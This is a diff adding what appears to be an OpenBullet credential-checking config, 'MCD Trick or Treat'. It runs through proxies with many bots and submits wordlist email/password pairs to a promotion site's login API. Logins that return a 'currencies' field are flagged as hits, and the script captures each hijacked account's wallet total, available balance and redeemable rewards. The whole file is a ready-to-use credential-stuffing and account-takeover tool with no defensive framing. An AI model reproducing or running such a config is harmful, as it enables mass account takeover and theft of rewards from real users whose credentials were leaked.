@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "MCD Trick or Treat",
+  "SuggestedBots": 50,
+  "LastModified": "2018-10-16T02:05:36.6507465+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mayday",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.tricktreatwin.com/api/registration/authenticate" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"channel\":\"WEB\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.tricktreatwin.com" 
+  HEADER "promotionid: 1" 
+  HEADER "origin: https://tricktreatwin.com" 
+#AWSALB PARSE "<COOKIES(AWSALB)>" LR "" "" Recursive=FALSE -> VAR "AWSALB" "" "" 
+#TOKENS REQUEST GET "https://www.tricktreatwin.com/api/wallet/currency" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Access-Control-Allow-Credentials: true" 
+  HEADER "Access-Control-Allow-Origin: https://tricktreatwin.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"currencies\":" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "\"currencies\":" 
+#TOTAL PARSE "<SOURCE>" LR "\"total\":" "," Recursive=FALSE -> CAP "TOTAL" "" "" 
+#AVAILABLE PARSE "<SOURCE>" LR "\"available\":" "}" Recursive=FALSE -> CAP "AVAILABLE" "" "" 
+#REDEEMABLE REQUEST GET "https://www.tricktreatwin.com/api/wallet/redeemable" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Access-Control-Allow-Credentials: true" 
+  HEADER "Access-Control-Allow-Origin: https://tricktreatwin.com" 
+#REDEEM PARSE "<SOURCE>" LR "[" "]" Recursive=FALSE -> CAP "" "" "" 
